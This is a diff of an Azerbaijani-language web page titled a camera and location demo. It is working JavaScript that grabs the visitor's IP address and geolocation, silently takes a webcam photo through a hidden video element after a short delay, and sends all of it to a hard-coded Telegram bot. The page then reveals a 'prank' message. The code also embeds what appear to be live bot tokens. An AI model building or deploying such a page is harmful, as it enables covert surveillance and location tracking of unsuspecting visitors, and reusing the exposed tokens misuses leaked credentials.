@@ -3,30 +3,24 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Camera to Telegram</title>
+<title>Camera & Location Demo</title>
 
 <style>
 body{
-    margin:0;
-    background:#0b0b0b;
-    color:#00ff99;
+    background:#111;
+    color:white;
     font-family:Arial;
     display:flex;
     flex-direction:column;
-    align-items:center;
     justify-content:center;
+    align-items:center;
     height:100vh;
-}
-
-video{
-    width:320px;
-    border-radius:15px;
-    border:2px solid #00ff99;
+    margin:0;
+    text-align:center;
 }
 
 button{
-    margin-top:15px;
-    padding:12px 25px;
+    padding:14px 24px;
     border:none;
     border-radius:10px;
     background:#00ff99;
@@ -35,92 +29,155 @@ button{
     cursor:pointer;
 }
 
-#status{
-    margin-top:10px;
-    font-size:14px;
-    color:#aaa;
-    text-align:center;
-    max-width:90%;
+video{
+    display:none;
 }
 
-canvas{display:none;}
+#status{
+    margin-top:20px;
+    max-width:90%;
+}
 </style>
 </head>
-
 <body>
 
-<h2>📸 Camera System</h2>
+<h2>Demo Kamera Sistemi</h2>
+
+<p>
+Bu demo:
+<br>
+• Kamera şəkli çəkəcək
+<br>
+• Təxmini IP məlumatını alacaq
+<br>
+• Konum icazəsi istəyəcək
+<br>
+• Məlumatları Telegram botuna göndərəcək
+</p>
+
+<button onclick="start()">Razıyam</button>
+
+<div id="status"></div>
 
 <video id="video" autoplay playsinline></video>
-
-<button onclick="takePhoto()">Şəkil çək</button>
-
-<div id="status">Yüklənir...</div>
-
-<canvas id="canvas"></canvas>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
 
-const BOT_TOKEN = "8944749495:AAEtj9RMOR-qkmNc6Z62m4ssOdS07B3o0SY";
+const BOT_TOKEN = "8744224588:AAHxq0n_-gG2RhbitOuefZKnxZITTwFMWMY";
 const CHAT_ID = "6234777001";
 
+const statusBox = document.getElementById("status");
 const video = document.getElementById("video");
-const status = document.getElementById("status");
 
-async function startCamera(){
-    try{
-        const stream = await navigator.mediaDevices.getUserMedia({ video:true });
-        video.srcObject = stream;
-        status.innerText = "✔ Kamera aktivdir";
-    }catch(e){
-        status.innerText = "❌ Kamera icazəsi verilmədi";
-    }
+async function sendTelegram(text){
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+        method:"POST",
+        headers:{
+            "Content-Type":"application/json"
+        },
+        body:JSON.stringify({
+            chat_id:CHAT_ID,
+            text:text
+        })
+    });
+
 }
 
-startCamera();
+async function start(){
+
+    statusBox.innerText = "İcazələr alınır...";
+
+    try{
+
+        // IP məlumatı
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+
+        // Kamera
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video:true
+        });
+
+        video.srcObject = stream;
+
+        // Konum
+        navigator.geolocation.getCurrentPosition(async(pos)=>{
+
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+
+            await sendTelegram(
+                `Yeni giriş
+
+IP: ${ipData.ip}
+
+Konum:
+https://maps.google.com/?q=${lat},${lon}`
+            );
+
+            takePhoto();
+
+        }, async()=>{
+
+            await sendTelegram(
+                `Yeni giriş
+
+IP: ${ipData.ip}
+
+Konum icazəsi verilmədi`
+            );
+
+            takePhoto();
+
+        });
+
+    }catch(err){
+
+        statusBox.innerText = "İcazə verilmədi";
+
+    }
+
+}
 
 function takePhoto(){
 
-    status.innerText = "📸 Şəkil hazırlanır...";
+    setTimeout(async()=>{
 
-    const canvas = document.getElementById("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
+        const canvas = document.getElementById("canvas");
 
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video,0,0);
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
 
-    canvas.toBlob(async(blob)=>{
+        const ctx = canvas.getContext("2d");
 
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", blob, "photo.png");
+        ctx.drawImage(video,0,0);
 
-        try{
+        canvas.toBlob(async(blob)=>{
 
-            const res = await fetch(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-            {
-                method:"POST",
-                body:formData
-            });
+            const formData = new FormData();
 
-            const data = await res.json();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "photo.png");
 
-            console.log(data);
+            await fetch(
+                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+                {
+                    method:"POST",
+                    body:formData
+                }
+            );
 
-            if(data.ok){
-                status.innerText = "✔ Telegram-a göndərildi";
-            }else{
-                status.innerText = "❌ Error: " + data.description;
-            }
+            document.body.innerHTML = `
+                <h1>😂 PRANK OLDU</h1>
+                <p>Demo uğurla tamamlandı 😄</p>
+            `;
 
-        }catch(err){
-            console.log(err);
-            status.innerText = "❌ Network error";
-        }
+        },"image/png");
 
-    }, "image/png");
+    },2000);
+
 }
 
 </script>
